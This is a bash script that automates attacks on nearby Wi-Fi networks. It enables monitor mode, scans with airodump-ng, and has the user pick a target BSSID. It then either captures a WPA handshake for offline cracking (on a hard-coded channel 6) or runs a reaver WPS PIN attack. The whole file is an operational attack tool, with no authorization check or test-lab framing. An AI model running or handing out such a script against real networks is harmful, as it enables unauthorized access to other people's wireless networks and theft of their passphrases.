#!/bin/bash

# Function to list available interfaces and allow user selection
list_interfaces() {
    echo "Available network interfaces:"
    iw dev | grep -E 'Interface' | awk '{print $2}'
    echo -n "Select the interface name (e.g., wlan0, phy0-ap0): "
    read iface
}

# Function to enable monitor mode on the selected interface
enable_monitor_mode() {
    # Check if a monitor mode interface already exists
    if iw dev | grep -q "mon0"; then
        echo "Monitor mode already enabled on mon0."
        mon_iface="mon0"
    else
        echo "Setting $iface to monitor mode..."
        # Retrieve the phy interface associated with the selected iface
        phy_iface=$(iw dev "$iface" info | grep wiphy | awk '{print "phy"$2}')
        
        if [ -n "$phy_iface" ]; then
            ip link set "$iface" down
            iw dev "$iface" interface add mon0 type monitor
            ip link set mon0 up
            echo "Monitor mode enabled on mon0."
            mon_iface="mon0"
        else
            echo "Unable to determine phy for $iface."
            echo "Monitor mode setup failed. Exiting."
            exit 1
        fi
    fi
}

# Function to scan networks and save BSSIDs to file
scan_networks() {
    echo "Scanning for networks on $mon_iface..."
    airodump-ng -w networks --output-format csv "$mon_iface" &
    airodump_pid=$!
    sleep 20  # Allow scanning to run for 20 seconds
    kill "$airodump_pid"
    echo "Network scanning completed. BSSIDs saved to networks-01.csv."
}

# Function to select a target by BSSID and perform an attack
attack_network() {
    echo "Choose a target from networks-01.csv for the attack."
    cat networks-01.csv | awk -F ',' 'NR>2 {print $1}' | sort -u
    echo -n "Enter BSSID of target: "
    read target_bssid

    echo "Selected target BSSID: $target_bssid"
    echo "Choose attack method:"
    echo "1) WPA handshake capture"
    echo "2) WPS attack"
    echo -n "Enter choice: "
    read attack_choice

    if [[ "$attack_choice" == "1" ]]; then
        echo "Starting WPA handshake capture..."
        airodump-ng --bssid "$target_bssid" -c 6 -w handshake_capture "$mon_iface" &
        sleep 20
        kill $!  # End airodump-ng after capturing for 20 seconds
        echo "WPA handshake capture complete."

    elif [[ "$attack_choice" == "2" ]]; then
        echo "Starting WPS attack using reaver..."
        reaver -i "$mon_iface" -b "$target_bssid" -vv
        echo "WPS attack complete."

    else
        echo "Invalid choice. Exiting."
        exit 1
    fi
}

# Reset the interface back to managed mode
reset_interface() {
    echo "Disabling monitor mode on $mon_iface and resetting $iface to managed mode."
    ip link set "$mon_iface" down
    iw dev "$mon_iface" del
    ip link set "$iface" up
    echo "Monitor mode disabled and interface reset."
}

# Main script flow
list_interfaces
enable_monitor_mode
scan_networks
sleep 5  # Pause briefly before attack selection
attack_network
reset_interface
